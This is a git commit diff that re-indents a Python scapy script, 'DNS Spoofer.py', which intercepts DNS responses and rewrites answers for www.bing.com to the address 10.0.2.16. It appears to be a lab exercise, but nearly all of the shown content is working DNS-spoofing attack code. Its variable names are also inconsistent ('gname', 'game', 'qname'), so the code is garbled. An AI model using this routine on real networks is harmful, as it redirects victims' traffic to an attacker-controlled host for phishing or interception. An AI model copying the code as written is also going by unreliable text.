ba7390ce4afb896044402096cf6ac6a8a9d7611d
Ross M <44169316+Scunnered@users.noreply.github.com>
2020-06-15 20:20:05 +0100

    Can Redirecting DNS Responses

--- DNS Spoofer.py
+++ DNS Spoofer.py
@@ -8,17 +8,17 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.DNSRR):
         gname = scapy_packet[scapy.DNSQR].qname
         if "www.bing.com" in game:
-        print(" -/- Spoofing Target")
-        answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
-        scapy_packet[scapy.DNS].an = answer
-        scapy_packet[scapy.DNS].ancount = 1
+            print(" -/- Spoofing Target")
+            answer = scapy.DNSRR(rrname=qname, rdata="10.0.2.16")
+            scapy_packet[scapy.DNS].an = answer
+            scapy_packet[scapy.DNS].ancount = 1
 
-        del scapy_packet[scapy.IP].len
-        del scapy_packet[scapy.IP].chksum
-        del scapy_packet[scapy.UDP].chksum
-        del scapy_packet[scapy.UDP].len
+            del scapy_packet[scapy.IP].len
+            del scapy_packet[scapy.IP].chksum
+            del scapy_packet[scapy.UDP].chksum
+            del scapy_packet[scapy.UDP].len
 
-        packet.set_payload(str(scapy_packet))
+            packet.set_payload(str(scapy_packet))
 
     packet.accept()
 
